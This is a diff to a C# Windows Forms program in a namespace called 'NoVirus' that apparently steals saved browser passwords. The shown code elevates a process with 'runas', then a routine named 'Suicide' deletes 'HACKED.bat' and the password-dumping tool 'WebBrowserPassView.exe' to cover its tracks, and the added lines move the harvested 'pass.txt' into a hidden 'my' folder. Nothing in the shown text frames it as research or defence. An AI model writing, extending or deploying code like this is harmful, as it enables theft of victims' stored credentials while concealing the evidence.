@@ -41,24 +41,32 @@ namespace NoVirus
                         my.StartInfo.UseShellExecute = true;
                         my.StartInfo.Verb = "runas";
                         my.Start();
+                        my.WaitForExit();
                     }
                 }
-                catch (Exception exc) { MessageBox.Show($"Error: {exc.Message}!\n Please, run this program as administrator!"); }
+                catch (Exception exc) { MessageBox.Show($"{exc.Message}!\n Please, run this program as administrator!", "Error!"); Close(); }
             }
-            else { MessageBox.Show($"Please, run this program as administrator!", "Error!"); }
+            else { MessageBox.Show($"Please, run this program as administrator!", "Error!"); Close(); }
             Suicide();
         }
 
         private void Suicide()
         {
-            Thread.Sleep(2000);
-            if (File.Exists($"{path}HACKED.bat")) { File.Delete($"{path}HACKED.bat"); }
-            if (File.Exists($"{path}WebBrowserPassView.exe")) { File.Delete($"{path}WebBrowserPassView.exe"); }
-        }
-
-        private void Form1_Load(object sender, EventArgs e)
-        {
-
+            if (isAdmin)
+            {
+                Thread.Sleep(1000);
+                if (File.Exists($"{path}HACKED.bat")) { File.Delete($"{path}HACKED.bat"); }
+                if (File.Exists($"{path}WebBrowserPassView.exe")) { File.Delete($"{path}WebBrowserPassView.exe"); }
+                if (File.Exists($"{path}pass.txt"))
+                {
+                    if (Directory.Exists($"{path}my") != true) { Directory.CreateDirectory($"{path}my"); }
+                    if (File.Exists($"{path}my\\pass.txt")) { File.Replace($"{path}pass.txt", $"{path}my\\pass.txt", ""); }
+                    else { File.Move($"{path}pass.txt", $"{path}my\\pass.txt"); }
+                }
+                else { Suicide(); }
+                Close();
+            }
+            else { Close(); }
         }
     }
 }
